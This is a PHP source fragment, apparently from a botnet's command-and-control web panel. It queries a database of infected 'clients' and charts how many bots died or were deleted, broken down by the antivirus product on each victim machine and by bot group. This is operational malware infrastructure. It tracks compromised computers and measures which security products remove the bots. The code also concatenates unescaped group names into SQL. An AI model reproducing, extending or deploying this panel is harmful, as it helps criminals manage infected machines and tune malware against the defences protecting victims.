ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00000200) AS 'BITDEFENDER',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00000400) AS 'BULLGUARD',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00000800) AS 'RISING_IS',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00001000) AS 'ARCAVIR',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00002000) AS 'WEBROOT',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00004000) AS 'EMSISOFT',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00008000) AS 'FSECURE',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00010000) AS 'PANDA',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00020000) AS 'PCTOOLS',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00040000) AS 'ZONEALARM',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00080000) AS 'GDATA_IS',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00100000) AS 'BKAV_IS',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00200000) AS 'GBUSTER_AV',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00400000) AS 'DR_WEB',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00800000) AS 'SOPHOS_ENDPOINT',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x01000000) AS 'COMODO_AV',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x02000000) AS 'AHNLAB_FREE',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x04000000) AS 'BAIDU_FREE',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x08000000) AS 'MALWAREBYTES'";
    $result = $sqlBots->Query($squery);
    $row = NULL;
    if (!$result || ($row = mysql_fetch_assoc($result))) {
    }
    if ($row != NULL) {
        echo "\r\n<script>\r\n\$(document).ready(function(){\r\nvar line1 = [";
        echo $row["NO_AV"];
        echo ", ";
        echo $row["NORTON"];
        echo ", ";
        echo $row["KAS"];
        echo ", ";
        echo $row["AVG"];
        echo ", ";
        echo $row["AVIRA"];
        echo ", ";
        echo $row["ESET"];
        echo ", ";
        echo $row["MCAFEE"];
        echo ", ";
        echo $row["TREND_MICRO"];
        echo ", ";
        echo $row["AVAST"];
        echo ", ";
        echo $row["BITDEFENDER"];
        echo ", ";
        echo $row["MSE"];
        echo ", ";
        echo $row["MALWAREBYTES"];
        echo ", ";
        echo $row["BULLGUARD"];
        echo ", ";
        echo $row["RISING_IS"];
        echo ", ";
        echo $row["ARCAVIR"];
        echo ", ";
        echo $row["WEBROOT"];
        echo ", ";
        echo $row["EMSISOFT"];
        echo ", ";
        echo $row["FSECURE"];
        echo ", ";
        echo $row["PANDA"];
        echo ", ";
        echo $row["PCTOOLS"];
        echo ", ";
        echo $row["GDATA_IS"];
        echo ", ";
        echo $row["ZONEALARM"];
        echo ", ";
        echo $row["BAIDU_FREE"];
        echo ", ";
        echo $row["DR_WEB"];
        echo ", ";
        echo $row["SOPHOS_ENDPOINT"];
        echo ", ";
        echo $row["AHNLAB_FREE"];
        echo ", ";
        echo $row["BKAV_IS"];
        echo ", ";
        echo $row["GBUSTER_AV"];
        echo "];\r\n  var plot3 = \$.jqplot('chart1', [line1], {\r\n    seriesDefaults: {renderer: \$.jqplot.BarRenderer},\r\n    series:[\r\n     {pointLabels:{\r\n        show: true,\r\n       labels:['No AV','Norton','Kaspersky','AVG','Avira','ESET','McAfee','TrendMicro','Avast!','BitDefender','MSE','MBAM','BullGuard','Rising','ArcaVir','Webroot','Emsisoft','F-Secure','Panda','PC Tools','GData','ZoneAlarm','Baidu AV','Dr Web','Sophos EP','Ahnlab V3L','BKav (VT)', 'GBuster (BR)'],\r\n      }}],\r\n\t  highlighter: {\r\n        show: true,\r\n        sizeAdjust: 7.5,\r\n\t\tformatString: '(index: %s),  %u dead bots'\r\n      },\r\n\r\n    axes: {\r\n      xaxis:{renderer:\$.jqplot.CategoryAxisRenderer},\r\n      yaxis:{padMax:1.3}}\r\n  });\r\n});\r\n\r\n</script>\r\n\r\n";
    }
    if (1 < $total_groups) {
        $num_queries = 0;
        $squery = "SELECT ";
        $group_names = "";
        if ($groups) {
            mysql_data_seek($groups, 0);
            while ($current_row = mysql_fetch_assoc($groups)) {
                if (25 <= $num_queries) {
                    break;
                }
                if (isset($current_row["GroupName"]) && 0 < strlen($current_row["GroupName"])) {
                    $squery .= "(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND GroupName = '" . $current_row["GroupName"] . "') AS 'res_" . $num_queries . "',";
                    $group_names .= "'" . $current_row["GroupName"] . "',";
                    $num_queries++;
                }
            }
            if (0 < $num_queries) {
                $squery = substr($squery, 0, strlen($squery) - 1);
                $group_names = substr($group_names, 0, strlen($group_names) - 1);
            }
        }
        $result = $sqlBots->Query($squery);
        $row = NULL;
        if (!$result || ($row = mysql_fetch_assoc($result))) {
        }
        if (0 < $num_queries && $row != NULL) {
            $isc = 0;
            for ($outputres = ""; isset($row["res_" . $isc]); $isc++) {
                $outputres .= $row["res_" . $isc] . ",";
            }
            if (0 < $isc) {
                $outputres = substr($outputres, 0, strlen($outputres) - 1);
            }
            echo "\r\n\t\t\t<table cellpadding=\"10\"  align=\"left\" width=\"1740\" style=\"font-size: 10px; face: font-family: Tahoma;\">\r\n\t\t\t\t<tr>\r\n\t\t\t\t\t<td>\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<span style=\"position: relative; top: 35px; left: 184px;\">\r\n\t\t\t\t\t\t\t<strong><font style=\"font-size: 14px;\">Dead bot statistics (By group - Most recent 25 groups)</font></strong>\r\n\t\t\t\t\t\t</span>\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<div id=\"chart5\" style=\"position: relative; top: 35px; left: 184px; height:420px; width:1760px; font-size: 14px; face: font-family: Tahoma;\"></div>\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t</td>\r\n\t\t\t\t</tr>\r\n\t\t\t</table>\r\n\r\n\t\t\t<script>\r\n\t\t\t\$(document).ready(function(){\r\n\t\t\tvar line1 = [";
            echo $outputres;
            echo "];\r\n\t\t\t  var plot3 = \$.jqplot('chart5', [line1], {\r\n\t\t\t\tseriesDefaults: {renderer: \$.jqplot.BarRenderer},\r\n\t\t\t\tseries:[\r\n\t\t\t\t {pointLabels:{\r\n\t\t\t\t\tshow: true,\r\n\t\t\t\t   labels:[";
            echo $group_names;
            echo "],\r\n\t\t\t\t  }}],\r\n\t\t\t\t  highlighter: {\r\n\t\t\t\t\tshow: true,\r\n\t\t\t\t\tsizeAdjust: 7.5,\r\n\t\t\t\t\tformatString: '(index: %s),  %u dead bots'\r\n\t\t\t\t  },\r\n\r\n\t\t\t\taxes: {\r\n\t\t\t\t  xaxis:{renderer:\$.jqplot.CategoryAxisRenderer},\r\n\t\t\t\t  yaxis:{padMax:1.3}}\r\n\t\t\t  });\r\n\t\t\t});\r\n\r\n\t\t\t</script>\r\n\r\n";
        }
    } else {
        echo "\t\t\t<table cellpadding=\"10\"  align=\"left\" width=\"1740\" style=\"font-size: 10px; face: font-family: Tahoma;\">\r\n\t\t\t\t<tr>\r\n\t\t\t\t\t<td>\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<span style=\"position: relative; top: 35px; left: 184px;\">\r\n\t\t\t\t\t\t\t<strong><font style=\"font-size: 14px;\">\r\n\t\t\t\t\t\t\tDead bot statistics (By group - Most recent 25 groups)\r\n\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t<i>- Only 1 group exists, so all dead bots are attributable to that group. There is no useful graph to display.</i>\r\n\t\t\t\t\t\t\t</font></strong>\r\n\t\t\t\t\t\t</span>\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t</td>\r\n\t\t\t\t</tr>\r\n\t\t\t</table>\r\n";
    }
}
echo "\r\n<br />\r\n";

?>